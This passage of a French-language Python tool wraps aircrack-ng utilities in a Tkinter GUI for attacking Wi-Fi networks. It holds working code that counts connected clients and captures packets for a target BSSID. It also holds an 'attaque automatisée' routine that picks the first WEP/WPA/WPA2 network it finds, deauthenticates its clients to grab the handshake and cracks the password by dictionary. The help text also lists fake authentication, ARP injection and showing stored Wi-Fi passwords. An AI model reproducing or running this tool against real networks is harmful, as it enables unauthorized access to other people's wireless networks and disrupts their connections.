    proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--output-format', 'csv', '-w', fichier_csv, interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    clients = []
    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Collecte des données...", total=10)
            time.sleep(5)  # Attendre pour collecter des données
            progress.update(tache, advance=10)

        fichier_csv_path = f"{fichier_csv}-01.csv"
        if not os.path.exists(fichier_csv_path):
            console.print("[red]Aucune donnée collectée.[/red]")
            logging.warning("Aucune donnée collectée lors du comptage")
            messagebox.showerror("Erreur", "Aucune donnée collectée.")
            return 0

        with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            donnees = f.read()

        sections = donnees.split("Station MAC")
        section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []

        # Tableau des clients connectés
        tableau_clients = Table(title=f"Clients connectés au réseau {ssid} ({bssid})")
        tableau_clients.add_column("MAC Client", style="cyan")
        tableau_clients.add_column("Fabricant", style="yellow")
        tableau_clients.add_column("Signal (dBm)", style="green")

        for ligne in section_clients:
            champs = [f.strip() for f in ligne.split(",")]
            if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                try:
                    signal = int(champs[3])
                    mac_client = champs[0]
                    fabricant = obtenir_fabricant(mac_client)
                    tableau_clients.add_row(mac_client, fabricant, str(signal))
                    clients.append({"mac_client": mac_client, "fabricant": fabricant, "signal": signal})
                except ValueError as e:
                    logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")
                    continue

        nombre_clients = len(clients)
        console.print(tableau_clients)
        console.print(f"[green]Nombre d'appareils connectés au réseau {ssid} : {nombre_clients}[/green]")
        logging.info(f"Nombre d'appareils connectés au réseau {ssid} ({bssid}) : {nombre_clients}")
        messagebox.showinfo("Succès", f"Nombre d'appareils connectés au réseau {ssid} : {nombre_clients}")

        # Sauvegarder les résultats en JSON
        resultat = {"ssid": ssid, "bssid": bssid, "clients": clients}
        fichier_json = os.path.join(dossier_capture, f"clients_{horodatage}.json")
        with open(fichier_json, 'w') as f:
            json.dump(resultat, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_json}[/green]")
        logging.info(f"Résultats des clients sauvegardés dans {fichier_json}")
        messagebox.showinfo("Succès", f"Résultats sauvegardés dans {fichier_json}")

        return nombre_clients

    except KeyboardInterrupt:
        proc.terminate()
        console.print("[red]Scan arrêté par l'utilisateur[/red]")
        logging.info("Scan du nombre d'appareils arrêté par l'utilisateur")
        messagebox.showinfo("Info", "Scan arrêté par l'utilisateur")
        return 0
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")
        logging.error(f"Erreur de comptage des appareils : {e}")
        messagebox.showerror("Erreur", f"Erreur : {e}")
        return 0
    finally:
        proc.terminate()
        # Nettoyer les fichiers temporaires
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv"]:
            if os.path.exists(f):
                os.remove(f)

# ====== CAPTURER DES PAQUETS ======
def capturer_paquets(bssid, interface, canal, fichier_sortie=None):
    """Capture des paquets pour un BSSID spécifique."""
    logging.info(f"Début de la capture de paquets pour BSSID={bssid}, interface={interface}, canal={canal}")
    if not bssid or not valider_mac(bssid):
        console.print("[red]Format de BSSID invalide ![/red]")
        logging.error(f"BSSID invalide: {bssid}")
        messagebox.showerror("Erreur", "Format de BSSID invalide !")
        return False
    if not interface or not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return False
    if not canal or not canal.isdigit() or not 1 <= int(canal) <= 14:
        console.print("[red]Canal invalide (doit être entre 1 et 14) ![/red]")
        logging.error(f"Canal invalide: {canal}")
        messagebox.showerror("Erreur", "Canal invalide (doit être entre 1 et 14) !")
        return False
    if not fichier_sortie:
        fichier_sortie = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    console.print(f"[bold yellow]Capture des paquets pour {bssid} sur le canal {canal}...[/bold yellow]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--channel', canal, '--write', fichier_sortie, interface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(15)  # Attendre pour capturer un handshake
        console.print(f"[green]Paquets sauvegardés dans {fichier_sortie}.cap[/green]")
        logging.info(f"Capture de paquets sauvegardée dans {fichier_sortie}.cap")
        messagebox.showinfo("Succès", f"Paquets sauvegardés dans {fichier_sortie}.cap")
        return True
    except KeyboardInterrupt:
        proc.terminate()
        console.print("[red]Capture arrêtée par l'utilisateur[/red]")
        logging.info("Capture arrêtée par l'utilisateur")
        messagebox.showinfo("Info", "Capture arrêtée par l'utilisateur")
        return False
    finally:
        proc.terminate()

# ====== ATTAQUE AUTOMATISÉE ======
def attaque_automatisee(interface, fichier_dico=None):
    """Automatise une attaque Wi-Fi : scan, capture de paquets, déauthentification, déchiffrement."""
    logging.info(f"Début de l'attaque automatisée sur {interface}, fichier dictionnaire={fichier_dico}")
    if not interface or not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        logging.error(f"Interface invalide: {interface}")
        messagebox.showerror("Erreur", "Nom d'interface invalide !")
        return

    console.print("[bold yellow]Lancement d'une attaque Wi-Fi automatisée...[/bold yellow]")

    # Étape 1 : Scanner les réseaux
    console.print("[cyan]Étape 1 : Scan des réseaux Wi-Fi...[/cyan]")
    resultats = scan_wifi_temps_reel(interface, signal_min=-70)
    if not resultats or not resultats["points_acces"]:
        console.print("[red]Aucun réseau détecté. Arrêt de l'attaque.[/red]")
        logging.error("Aucun réseau détecté lors du scan")
        messagebox.showerror("Erreur", "Aucun réseau détecté. Arrêt de l'attaque.")
        return

    # Sélectionner un réseau cible (privilégier WPA/WPA2 ou WEP)
    cible = None
    for ap in resultats["points_acces"]:
        if ap["securite"] in ["WPA", "WPA2", "WEP"]:
            cible = ap
            break
    if not cible:
        console.print("[red]Aucun réseau vulnérable (WEP ou WPA/WPA2) détecté.[/red]")
        logging.error("Aucun réseau vulnérable détecté")
        messagebox.showerror("Erreur", "Aucun réseau vulnérable (WEP ou WPA/WPA2) détecté.")
        return

    console.print(f"[green]Cible sélectionnée : {cible['ssid']} ({cible['bssid']}) - Sécurité : {cible['securite']}[/green]")
    logging.info(f"Cible sélectionnée : {cible['ssid']} ({cible['bssid']})")

    # Créer un dossier pour l'attaque
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_attaque = f"attaque_{cible['bssid'].replace(':', '')}_{horodatage}"
    os.makedirs(dossier_attaque, exist_ok=True)
    console.print(f"[green]Dossier créé : {dossier_attaque}[/green]")
    logging.info(f"Dossier d'attaque créé : {dossier_attaque}")

    # Étape 2 : Régler le canal
    canal = cible["canal"]
    console.print(f"[cyan]Étape 2 : Réglage de l'interface sur le canal {canal}...[/cyan]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)

    # Étape 3 : Lancer une attaque de déauthentification (si WPA/WPA2)
    deauth_status = "N/A"
    if cible["securite"] in ["WPA", "WPA2"]:
        console.print("[cyan]Étape 3 : Envoi de déauthentification pour capturer le handshake...[/cyan]")
        deauth_status = "Réussie" if attaquer_wifi(cible["bssid"], interface, canal, "deauth") else "Échouée"

    # Étape 4 : Capturer les paquets
    nom_fichier_capture = f"capture_{cible['bssid'].replace(':', '')}_{horodatage}"
    fichier_sortie = os.path.join(dossier_attaque, nom_fichier_capture)
    console.print(f"[cyan]Étape 4 : Capture des paquets pour {cible['bssid']}...[/cyan]")
    capture_status = "Réussie" if capturer_paquets(cible["bssid"], interface, canal, fichier_sortie) else "Échouée"
    if capture_status == "Échouée":
        console.print("[red]Échec de la capture de paquets. Arrêt de l'attaque.[/red]")
        logging.error("Échec de la capture de paquets")
        messagebox.showerror("Erreur", "Échec de la capture de paquets. Arrêt de l'attaque.")
        return

    # Étape 5 : Déchiffrer le fichier .cap
    console.print("[cyan]Étape 5 : Tentative de déchiffrement...[/cyan]")
    if not fichier_dico:
        fichier_dico = simpledialog.askstring("Dictionnaire", "Entrez le chemin du fichier dictionnaire (ou vide pour ignorer) : ")
    dechiffrement_status = "Réussie" if dechiffrer_cap(f"{fichier_sortie}.cap", cible["securite"], fichier_dico) else "Échouée"

    # Afficher un tableau récapitulatif de l'attaque
    tableau_recap = Table(title="Récapitulatif de l'attaque automatisée")
    tableau_recap.add_column("Étape", style="cyan")
    tableau_recap.add_column("Description", style="magenta")
    tableau_recap.add_column("Statut", style="green")

    tableau_recap.add_row("1 - Scan", "Scan des réseaux Wi-Fi", "Réussie")
    tableau_recap.add_row("2 - Sélection cible", f"Cible : {cible['ssid']} ({cible['bssid']})", "Réussie")
    tableau_recap.add_row("3 - Déauthentification", "Envoi de paquets de déauthentification", deauth_status)
    tableau_recap.add_row("4 - Capture paquets", f"Fichier : {fichier_sortie}.cap", capture_status)
    tableau_recap.add_row("5 - Déchiffrement", "Tentative de craquage du mot de passe", dechiffrement_status)

    console.print(tableau_recap)
    logging.info(f"Attaque automatisée terminée: fichier={fichier_sortie}.cap, statut_déchiffrement={dechiffrement_status}")
    messagebox.showinfo("Succès", "Attaque automatisée terminée. Consultez la console pour le récapitulatif.")

# ====== RÉCAPITULATIF GRAPHIQUE ======
def afficher_recapitulatif_gui():
    """Affiche une interface graphique récapitulant l'utilisation de toutes les fonctions."""
    logging.info("Affichage du récapitulatif graphique")
    console.print("[bold yellow]Lancement du récapitulatif graphique...[/bold yellow]")

    # Initialiser la fenêtre Tkinter
    fenetre = tk.Tk()
    fenetre.title("Récapitulatif des actions Wi-Fi")
    fenetre.geometry("1000x600")

    # Créer un tableau avec Tkinter
    tableau = ttk.Treeview(fenetre, columns=("Fonction", "Horodatage", "Statut", "Résumé"), show="headings")
    tableau.heading("Fonction", text="Fonction")
    tableau.heading("Horodatage", text="Horodatage")
    tableau.heading("Statut", text="Statut")
    tableau.heading("Résumé", text="Résumé")
    tableau.pack(fill="both", expand=True)

    def charger_recapitulatif():
        """Charge les données des logs et fichiers JSON pour remplir le tableau."""
        for item in tableau.get_children():
            tableau.delete(item)

        actions = []
        fonction_map = {
            "scan_wifi_temps_reel": "Scanner les réseaux Wi-Fi (moniteur)",
            "scan_wifi_normal": "Scanner les réseaux Wi-Fi (normal)",
            "dechiffrer_cap": "Déchiffrer un fichier .cap",
            "attaquer_wifi": "Lancer une attaque Wi-Fi",
            "historique_wifi": "Afficher l'historique Wi-Fi",
            "compter_appareils_connectes": "Compter les appareils connectés",
            "capturer_paquets": "Capturer des paquets",
            "attaque_automatisee": "Attaque automatisée",
            "surveiller_trafic_ip": "Surveiller le trafic IP",
            "detecter_vulnerabilites_wifi": "Détecter les vulnérabilités Wi-Fi",
            "surveiller_clients_gui": "Surveillance en temps réel (GUI)"
        }

        try:
            with open('wifi_tool.log', 'r', encoding='utf-8') as f:
                lignes = f.readlines()
            for ligne in lignes:
                match = re.match(r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - \[(\w+)\] - (\w+) - (.+)', ligne)
                if match:
                    horodatage, fonction, niveau, message = match.groups()
                    nom_fonction = fonction_map.get(fonction, fonction)
                    statut = "Succès" if niveau == "INFO" else "Échec" if niveau == "ERROR" else "Arrêté"
                    resume = message

                    # Extraire des détails spécifiques
                    if "sauvegardés dans" in message:
                        fichier = re.search(r'sauvegardés dans (.+)', message)
                        if fichier:
                            fichier_path = fichier.group(1)
                            if os.path.exists(fichier_path) and fichier_path.endswith('.json'):
                                try:
                                    with open(fichier_path, 'r') as f:
                                        data = json.load(f)
                                    if fonction == "scan_wifi_temps_reel":
                                        resume = f"{len(data.get('points_acces', []))} réseaux, {len(data.get('clients', []))} clients"
                                    elif fonction == "compter_appareils_connectes":
                                        resume = f"{len(data.get('clients', []))} appareils connectés à {data.get('ssid')}"
                                    elif fonction == "detecter_vulnerabilites_wifi":
                                        resume = f"{len(data)} réseaux analysés"
                                except json.JSONDecodeError:
                                    pass
                    elif fonction == "surveiller_trafic_ip" and "fichier=" in message:
                        fichier = re.search(r'fichier=(.+)', message)
                        if fichier:
                            resume = f"Paquets capturés, fichier={fichier.group(1)}"
                    elif fonction == "attaque_automatisee" and "fichier=" in message:
                        fichier = re.search(r'fichier=(.+?),', message)
                        if fichier:
                            resume = f"Attaque terminée, fichier={fichier.group(1)}"
                    elif fonction == "historique_wifi":
                        resume = f"{message.split(': ')[1]} réseaux trouvés"

                    actions.append({
                        "fonction": nom_fonction,
                        "horodatage": horodatage,
                        "statut": statut,
                        "resume": resume
                    })

            for action in actions:
                tableau.insert("", "end", values=(
                    action["fonction"],
                    action["horodatage"],
                    action["statut"],
                    action["resume"]
                ))
        except FileNotFoundError:
            console.print("[red]Fichier de log non trouvé.[/red]")
            logging.error("Fichier wifi_tool.log non trouvé")
            tableau.insert("", "end", values=("Erreur", datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "Échec", "Fichier de log manquant"))
            messagebox.showerror("Erreur", "Fichier de log non trouvé.")

    # Boutons pour actualiser et quitter
    def actualiser():
        charger_recapitulatif()

    bouton_actualiser = tk.Button(fenetre, text="Actualiser", command=actualiser)
    bouton_actualiser.pack(pady=5)

    bouton_quitter = tk.Button(fenetre, text="Quitter", command=fenetre.destroy)
    bouton_quitter.pack(pady=5)

    try:
        charger_recapitulatif()
        fenetre.mainloop()
        logging.info("Récapitulatif graphique fermé")
        messagebox.showinfo("Info", "Récapitulatif graphique fermé")
    except Exception as e:
        console.print(f"[red]Erreur lors de l'affichage du récapitulatif : {e}[/red]")
        logging.error(f"Erreur lors de l'affichage du récapitulatif : {e}")
        messagebox.showerror("Erreur", f"Erreur lors de l'affichage du récapitulatif : {e}")

# ====== AIDE / DOCUMENTATION ======
def aide():
    """Affiche l'aide et la documentation."""
    logging.info("Affichage de l'aide")
    message = """=== Aide / Documentation ===

1 - Scanner les réseaux Wi-Fi : Détecte le mode moniteur et scanne en temps réel avec airodump-ng ou en mode normal avec nmcli.
2 - Déchiffrer un fichier .cap : Déchiffre les fichiers .cap pour WEP ou WPA/WPA2 avec aircrack-ng.
3 - Lancer une attaque Wi-Fi : Supporte la déauthentification, le fake auth et l'injection ARP avec aireplay-ng.
4 - Afficher l'historique Wi-Fi : Liste les réseaux Wi-Fi enregistrés avec SSID, UUID, type, mot de passe et BSSID.
5 - Compter les appareils connectés : Compte les appareils connectés au réseau Wi-Fi auquel vous êtes connecté.
6 - Capturer des paquets : Capture les paquets pour un BSSID spécifique dans un fichier .cap.
7 - Attaque automatisée : Scanne, capture, déauthentifie et déchiffre automatiquement un réseau cible.
8 - Surveiller le trafic IP : Capture et analyse le trafic réseau pour une adresse IP donnée.
9 - Détecter les vulnérabilités Wi-Fi : Identifie les réseaux avec WPS activé ou SSID masqué.
10 - Surveillance en temps réel avec GUI : Affiche une interface graphique pour surveiller les clients connectés.
11 - Afficher le récapitulatif graphique : Affiche une interface graphique récapitulant toutes les actions effectuées.
12 - Aide / Documentation : Affiche cette aide.
13 - Quitter : Quitte le programme.
"""
    messagebox.showinfo("Aide / Documentation", message)
    logging.info("Aide affichée")

# ====== INTERFACE GRAPHIQUE PRINCIPALE ======
def main_gui():
    """Interface graphique principale avec boutons pour chaque fonction."""
    logging.info("Démarrage de l'interface graphique principale")
    fenetre = tk.Tk()
    fenetre.title("Outil Wi-Fi - Interface Graphique")
    fenetre.geometry("600x600")

    # Titre
    label_titre = tk.Label(fenetre, text="Outil Wi-Fi", font=("Arial", 16, "bold"))
    label_titre.pack(pady=10)

    # Boutons pour chaque option
    tk.Button(fenetre, text="1 - Scanner les réseaux Wi-Fi", command=scan_wifi).pack(fill='x', pady=5)
    tk.Button(fenetre, text="2 - Déchiffrer un fichier .cap", command=lambda: dechiffrer_cap(
        simpledialog.askstring("Fichier .cap", "Entrez le chemin du fichier .cap : "),
        simpledialog.askstring("Type de sécurité", "Sécurité (WEP ou WPA) : "),
        simpledialog.askstring("Dictionnaire", "Chemin du fichier dictionnaire (pour WPA) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="3 - Lancer une attaque Wi-Fi", command=lambda: attaquer_wifi(
        simpledialog.askstring("BSSID", "Entrez le BSSID cible : "),
        simpledialog.askstring("Interface", "Entrez l'interface en mode moniteur : "),
        simpledialog.askstring("Canal", "Entrez le canal du réseau : "),
        simpledialog.askstring("Type d'attaque", "Type (deauth, fakeauth, arpreplay) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="4 - Afficher l'historique Wi-Fi", command=historique_wifi).pack(fill='x', pady=5)
    tk.Button(fenetre, text="5 - Compter les appareils connectés", command=lambda: compter_appareils_connectes(
        simpledialog.askstring("Interface", "Entrez l'interface réseau (ex. wlan0) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="6 - Capturer des paquets", command=lambda: capturer_paquets(
        simpledialog.askstring("BSSID", "Entrez le BSSID cible : "),
        simpledialog.askstring("Interface", "Entrez l'interface en mode moniteur : "),
        simpledialog.askstring("Canal", "Entrez le canal du réseau : "),
        simpledialog.askstring("Fichier sortie", "Nom du fichier de sortie (sans extension) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="7 - Lancer une attaque automatisée", command=lambda: attaque_automatisee(
        simpledialog.askstring("Interface", "Entrez l'interface en mode moniteur : "),
        simpledialog.askstring("Dictionnaire", "Entrez le chemin du fichier dictionnaire : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="8 - Surveiller le trafic IP", command=lambda: surveiller_trafic_ip(
        simpledialog.askstring("Interface", "Entrez l'interface réseau (ex. wlan0) : "),
        simpledialog.askstring("IP cible", "Entrez l'adresse IP à surveiller : "),
        simpledialog.askinteger("Durée", "Durée de capture en secondes (défaut 30) : ") or 30
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="9 - Détecter les vulnérabilités Wi-Fi", command=lambda: detecter_vulnerabilites_wifi(
        simpledialog.askstring("Interface", "Entrez l'interface en mode moniteur (ex. wlan0mon) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="10 - Surveillance en temps réel avec GUI", command=lambda: surveiller_clients_gui(
        simpledialog.askstring("Interface", "Entrez l'interface réseau (ex. wlan0) : ")
    )).pack(fill='x', pady=5)
    tk.Button(fenetre, text="11 - Afficher le récapitulatif graphique", command=afficher_recapitulatif_gui).pack(fill='x', pady=5)
    tk.Button(fenetre, text="12 - Aide / Documentation", command=aide).pack(fill='x', pady=5)
    tk.Button(fenetre, text="13 - Quitter", command=fenetre.quit).pack(fill='x', pady=5)

    fenetre.mainloop()
    logging.info("Programme quitté")

if __name__ == "__main__":
    main_gui()